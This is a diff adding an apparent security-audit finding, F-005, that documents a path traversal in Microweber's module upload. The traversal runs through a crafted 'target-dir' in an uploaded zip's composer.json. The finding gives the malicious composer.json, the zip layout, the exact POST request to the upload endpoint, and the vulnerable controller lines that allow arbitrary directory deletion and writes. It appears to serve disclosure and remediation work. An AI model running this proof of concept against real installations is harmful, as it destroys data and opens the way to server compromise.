@@ -1,0 +1,34 @@
+### F-005: Path Traversal via Module Upload (target-dir in composer.json)
+### Severity: HIGH | Auth: Admin | Method: POST (multipart)
+### Impact: rmdir_recursive() on arbitrary path, then rename cache dir to attacker-controlled path
+### Requires: config('microweber.allow_php_files_upload') = true  OR  default admin upload flow
+###
+### Step 1: Create malicious zip with crafted composer.json
+### (run on attacker machine, then upload via admin panel)
+###
+### malicious/composer.json content:
+###   { "target-dir": "../../malicious_module" }
+###
+### This causes:
+###   rmdir_recursive($modulesPath . '/../../malicious_module')  → deletes arbitrary dir
+###   rename($cacheDir, $modulesPath . '/../../malicious_module')  → writes to arbitrary path
+
+POST /api/module-upload/upload HTTP/1.1
+Host: localhost:8888
+Content-Type: application/x-www-form-urlencoded
+Cookie: [ADMIN SESSION COOKIE]
+User-Agent: Mozilla/5.0
+Connection: close
+Content-Length: 42
+
+src=userfiles/tmp/evil_module_uploaded.zip
+
+### Pre-condition: upload the malicious zip via admin file manager first
+### ZIP contents:
+###   config.php       (empty, just needs to exist)
+###   composer.json    { "target-dir": "../../pwned" }
+###
+### WHY IT WORKS:
+###   ModuleUploadController.php:90: rmdir_recursive($modulesPath.'/'.$composerModuleJson['target-dir'])
+###   ModuleUploadController.php:94: rename($cacheModuleDir, $modulesPath.'/'.$composerModuleJson['target-dir'])
+###   'target-dir' read directly from zip's composer.json — no sanitization
